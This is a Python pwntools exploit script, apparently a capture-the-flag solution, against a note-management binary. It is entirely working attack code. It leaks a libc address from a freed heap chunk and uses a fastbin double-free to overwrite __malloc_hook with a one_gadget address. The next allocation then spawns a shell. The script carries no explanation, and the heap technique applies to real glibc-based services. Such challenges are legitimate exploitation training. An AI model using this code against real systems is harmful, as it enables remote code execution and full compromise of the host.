#coding:utf-8

from pwn import *

context.log_level = "debug"

local = 1
if local:
    p = remote("172.17.0.2", 1234)
    raw_input("go")
else:
    p = remote("127.0.0.1", 1234)

def action(number):
    p.sendlineafter("Your choice: ", str(number))

def add(size, title, content, shell=False):
    action(1)
    p.sendlineafter("the note size: ", str(size))
    if shell:
        p.interactive()
        exit(0)
    p.recvuntil("input the title: ")
    p.send(title)
    p.recvuntil("input the content: ")
    p.send(content)

def show(index):
    action(3)
    p.sendlineafter("do you want to show: ", str(index))

def delete(index):
    action(2)
    p.sendlineafter(" do you want to delete: ", str(index))

add(0xe0-0x10, 'a\n', 'a\n') # 0
add(0x80, 'b'*16+'\x10', 'b\n') # 1
delete(0)
show(1)

p.recvuntil("content: ")
data = p.recv(8)
leak_addr = u64(data)
libc_base = leak_addr - 88 - 0x3c4b20
malloc_hook_addr = libc_base + 0x3c4b10
info("malloc_hook_addr: {}".format(hex(malloc_hook_addr)))
one_gadget = libc_base + 0xf1147

add(0x60, 'c\n', 'c\n') # 0
add(0x60, 'd\n', 'd\n') # 2
add(0x60, 'e\n', 'e\n') # 3

delete(0)
delete(2)
delete(1)

add(0x60, 'b\n', p64(malloc_hook_addr-0x23)+'\n') # 0
add(0x60, 'd\n', 'd\n') # 1
add(0x60, 'c\n', 'c\n') # 2
add(0x60, 'f\n', '\x00'*3+p64(0)*2+p64(one_gadget)+'\n')
add(0x30, 'g\n', 'aa\n', shell=True)

p.interactive()
